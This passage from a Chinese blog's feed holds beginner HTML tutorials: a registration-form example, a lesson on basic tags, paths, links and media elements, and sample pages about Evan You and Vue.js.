class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 教育经历 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>教育经历<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>最高学历：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>博士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>学校名称：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>所学专业：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>在校时间：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2015<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2016<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2017<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2018<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  --</span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2019<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2020<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2021<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2022<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 工作经历 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>工作经历<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>公司名称：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>工作描述：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 协议 和 按钮 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>已阅读并同意以下协议：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>《用户服务协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>《隐私政策》<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>免费注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重新填写<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">HTML进阶</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="HTML" scheme="https://www.777nx.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>HTML基础</title>
    <link href="https://www.777nx.cn/posts/e173abca.html"/>
    <id>https://www.777nx.cn/posts/e173abca.html</id>
    <published>2023-06-11T01:26:33.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>阶段目标：掌握HTML、CSS常用布局技巧，能够独立制作网页。</p></blockquote><h1>HTML 基础</h1><blockquote><p>目标：掌握标签基本语法，能够独立布局文章页。</p></blockquote><h2 id="01-今日课程介绍">01-今日课程介绍</h2><blockquote><p>今日目标：掌握标签基本语法，能够独立布局文章页。</p></blockquote><h3 id="核心技术点">核心技术点</h3><ul><li><p>网页组成</p></li><li><p>排版标签</p></li><li><p>多媒体标签及属性</p></li><li><p>综合案例一 - 个人简介</p><p><img src="https://img.777nx.cn/test/1680242340931.png" alt="1680242340931"></p></li><li><p>综合案例二 - Vue 简介</p><p><img src="https://img.777nx.cn/test/1680242362352.png" alt="1680242362352"></p></li></ul><h2 id="02-标签语法">02-标签语法</h2><p>HTML 超文本标记语言——HyperText Markup Language。</p><ul><li>超文本：链接</li><li>标记：标签，带尖括号的文本</li></ul><p><img src="https://img.777nx.cn/test/1680242502155.png" alt="1680242502155"></p><h3 id="标签结构">标签结构</h3><ul><li>标签要成对出现，中间包裹内容</li><li>&lt;&gt;里面放英文字母（标签名）</li><li>结束标签比开始标签多 /</li><li>标签分类：双标签和单标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>需要加粗的文字<span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1680242555328.png" alt="1680242555328"></p><h2 id="03-HTML骨架">03-HTML骨架</h2><ul><li>html：整个网页</li><li>head：网页头部，用来存放给浏览器看的信息，例如 CSS<ul><li>title：网页标题</li></ul></li><li>body：网页主体，用来存放给用户看的信息，例如图片、文字</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    网页主体</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>提示</p><p>VS Code 可以快速生成骨架：在 HTML 文件（.html）中，!（英文）配合 Enter / Tab 键</p></blockquote><h2 id="04-标签的关系">04-标签的关系</h2><blockquote><p>作用：明确标签的书写位置，让代码格式更整齐</p></blockquote><ul><li><p>父子关系（嵌套关系）：子级标签换行且缩进（Tab键）</p><p><img src="https://img.777nx.cn/test/1680255766672.png" alt="1680255766672"></p></li><li><p>兄弟关系（并列关系）：兄弟标签换行要对齐</p><p><img src="https://img.777nx.cn/test/1680255775150.png" alt="1680255775150"></p></li></ul><h2 id="05-注释">05-注释</h2><p>概念：注释是对代码的解释和说明，能够提高程序的可读性，方便理解、查找代码。</p><p>注释不会再浏览器中显示。</p><p>在 VS Code 中，<strong>添加 / 删除</strong>注释的快捷键：<strong>Ctrl + /</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 我是 HTML 注释 --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="06-标题标签">06-标题标签</h2><p>一般用在新闻标题、文章标题、网页区域名称、产品名称等等。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>四级标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>五级标题<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示特点：</p><ul><li>文字加粗</li><li>字号逐渐减小</li><li>独占一行（换行）</li></ul><blockquote><p>经验</p><ol><li>h1 标签在一个网页中只能用一次，用来放新闻标题或网页的 logo</li><li>h2 ~ h6 没有使用次数的限制</li></ol></blockquote><h2 id="07-段落标签">07-段落标签</h2><p>一般用在新闻段落、文章段落、产品描述信息等等。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示特点：</p><ul><li>独占一行</li><li>段落之间存在间隙</li></ul><h2 id="08-换行和水平线">08-换行和水平线</h2><ul><li>换行：br</li><li>水平线：hr</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="09-文本格式化标签">09-文本格式化标签</h2><p>作用：为文本添加特殊格式，以突出重点。常见的文本格式：加粗、倾斜、下划线、删除线等。</p><p><img src="https://img.777nx.cn/test/1680314078647.png" alt="1680314078647"></p><blockquote><p>提示：strong、em、ins、del 标签自带强调含义（语义）。</p></blockquote><h2 id="10-图像标签">10-图像标签</h2><p>作用：在网页中插入图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">&quot;图片的 URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>src用于指定图像的位置和名称，是 <img> 的必须属性。</p><h3 id="图像属性">图像属性</h3><p><img src="https://img.777nx.cn/test/1680314152822.png" alt="1680314152822"></p><h3 id="属性语法">属性语法</h3><ul><li>属性名=“属性值”</li><li>属性写在尖括号里面，标签名后面，标签名和属性之间用空格隔开，不区分先后顺序</li></ul><p><img src="https://img.777nx.cn/test/1680314195951.png" alt="1680314195951"></p><h2 id="11-路径">11-路径</h2><p>概念：路径指的是查找文件时，从<strong>起点</strong>到<strong>终点</strong>经历的<strong>路线</strong>。</p><p>路径分类：</p><ul><li>相对路径：从当前文件位置出发查找目标文件</li><li>绝对路径：从盘符出发查找目标文件<ul><li>Windows 电脑从盘符出发</li><li>Mac 电脑从根目录出发</li></ul></li></ul><h3 id="相对路径">相对路径</h3><p>查找方式：从<strong>当前文件位置</strong>出发查找目标文件</p><p>特殊符号：</p><ul><li><strong>/</strong> 表示进入某个文件夹里面          → 文件夹名/</li><li>**. ** 表示当前文件所在文件夹           → ./</li><li><strong>…</strong> 表示当前文件的上一级文件夹 → …/</li></ul><p><img src="https://img.777nx.cn/test/1680314322997.png" alt="1680314322997"></p><h3 id="绝对路径">绝对路径</h3><p>查找方式：Windows 电脑从盘符出发；Mac 电脑从根目录（/）出发</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">&quot;C:\images\mao.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>提示</p><ol><li>Windows 默认是 \ ，其他系统是 /，建议统一写为 /</li><li>特殊的绝对路径 → 文件的在线网址：<a href="https://www.itheima.com/images/logo.png">https://www.itheima.com/images/logo.png</a> &quot;，应用场景：网页底部<strong>友情链接</strong></li></ol></blockquote><p><img src="https://img.777nx.cn/test/1680314503056.png" alt="1680314503056"></p><h2 id="12-超链接标签">12-超链接标签</h2><p>作用：点击跳转到其他页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>跳转到百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>href 属性值是跳转地址，是超链接的必须属性。</strong></p><p>超链接默认是在当前窗口跳转页面，添加 <strong>target=“_blank”</strong> 实现<strong>新窗口</strong>打开页面。</p><p>拓展：开发初期，不确定跳转地址，则 href 属性值写为 <strong>#</strong>，表示<strong>空链接</strong>，页面不会跳转，在当前页面刷新一次。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span>&gt;</span>跳转到百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 跳转到本地文件：相对路径查找 --&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- target=&quot;_blank&quot; 新窗口跳转页面 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./01-标签的写法.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>跳转到01-标签的写法<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 开发初期，不知道超链接的跳转地址，href属性值写#，表示空链接，不会跳转 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>空链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-音频">13-音频</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;音频的 URL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常用属性</p><p><img src="https://img.777nx.cn/test/1680314629860.png" alt="1680314629860"></p><blockquote><p>拓展：书写 HTML5 属性时，如果属性名和属性值相同，可以简写为一个单词。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在 HTML5 里面，如果属性名和属性值完全一样，可以简写为一个单词 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;./media/music.mp3&quot;</span> <span class="attr">controls</span> <span class="attr">loop</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="14-视频">14-视频</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;视频的 URL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常用属性</p><p><img src="https://img.777nx.cn/test/1680314703735.png" alt="1680314703735"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在浏览器中，想要自动播放，必须有 muted 属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;./media/vue.mp4&quot;</span> <span class="attr">controls</span> <span class="attr">loop</span> <span class="attr">muted</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="15-综合案例一-个人简介">15-综合案例一-个人简介</h2><blockquote><p>网页制作思路：从上到下，先整体再局部，逐步分析制作</p><p>分析内容 → 写代码 → 保存 → 刷新浏览器，看效果</p></blockquote><p><img src="https://img.777nx.cn/test/1680314754557.png" alt="1680314754557"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>尤雨溪<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>尤雨溪，前端框架<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;../17-综合案例二/vue简介.html&quot;</span>&gt;</span>Vue.js<span class="tag">&lt;/<span class="name">a</span>&gt;</span>的作者，<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>HTML5<span class="tag">&lt;/<span class="name">a</span>&gt;</span>版Clear的打造人，独立开源开发者。曾就职于Google Creative Labs和Meteor Development Group。由于工作中大量接触开源的项目<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">a</span>&gt;</span>，最后自己也走上了开源之路，现全职开发和维护<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Vue.js<span class="tag">&lt;/<span class="name">a</span>&gt;</span>。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./photo.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;尤雨溪的照片&quot;</span> <span class="attr">title</span>=<span class="string">&quot;尤雨溪&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学习经历<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>尤雨溪毕业于上海复旦附中，在美国完成大学学业，本科毕业于Colgate University，后在Parsons设计学院获得Design &amp; Technology艺术硕士学位，任职于纽约Google Creative Lab。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>主要成就<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>尤雨溪<span class="tag">&lt;<span class="name">strong</span>&gt;</span>大学专业并非是计算机专业<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>，在大学期间他学习专业是室内艺术和艺术史，后来读了美术设计和技术的硕士， <span class="tag">&lt;<span class="name">ins</span>&gt;</span>正是在读硕士期间，他偶然接触到了JavaScript ，从此被这门编程语言深深吸引，开启了自己的前端生涯<span class="tag">&lt;/<span class="name">ins</span>&gt;</span> 。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2014年2月，开发了一个前端开发库Vue.js。Vue.js 是构建 Web 界面的 JavaScript 框架，是一个通过简洁的API提供高效的数据绑定和灵活的组件系统。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>社会任职<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2016年9月3日，在南京的JSConf上，Vue作者尤雨溪正式宣布加盟阿里巴巴Weex团队，尤雨溪称他将以技术顾问的身份加入Weex团队来做 Vue 和 Weex 的 JavaScript runtime 整合，目标是让大家能用 Vue 的语法跨三端。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="16-综合案例二-Vue简介">16-综合案例二-Vue简介</h2><p><img src="https://img.777nx.cn/test/1680314805528.png" alt="1680314805528"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Vue.js<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式JavaScript框架。 [5] 与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用（SPA）提供驱动。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>其作者为<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;../16-综合案例一/个人简介.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>尤雨溪<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>主要功能<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Vue.js是一套构建用户界面的渐进式框架。与其他重量级框架不同的是，Vue采用自底向上增量开发的设计。Vue 的核心库只关注视图层，并且非常容易学习，非常容易与其它库或已有项目整合。另一方面，Vue 完全有能力驱动采用单文件组件和Vue生态系统支持的库开发的复杂单页应用。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Vue.js 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Vue.js 自身不是一个全能框架——它只聚焦于视图层。因此它非常容易学习，非常容易与其它库或已有项目整合。另一方面，在与相关工具和支持库一起使用时 [2] ，Vue.js 也能驱动复杂的单页应用。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;../media/vue.mp4&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">HTML基础</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="HTML" scheme="https://www.777nx.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>博客一年，我收获了什么？</title>
    <link href="https://www.777nx.cn/posts/803331d3.html"/>
    <id>https://www.777nx.cn/posts/803331d3.html</id>
    <published>2023-06-02T00:17:18.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
